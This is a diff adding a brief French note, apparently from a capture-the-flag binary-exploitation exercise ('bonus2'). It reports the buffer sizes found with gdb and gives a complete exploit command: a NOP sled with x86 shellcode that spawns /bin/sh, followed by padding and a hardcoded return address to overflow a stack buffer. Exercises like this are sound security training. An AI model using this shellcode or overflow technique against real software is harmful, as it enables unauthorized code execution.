@@ -1,0 +1,4 @@
+on peut voir avec gdb que le programme prends 2 arguments.
+les buffers font 40 pour le premier argument et 32
+
+./bonus2 `python -c "print('\x90' * 15 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"` `python -c "print('B' * 18 + '\xbf\xff\xf6\x15'[::-1])"`
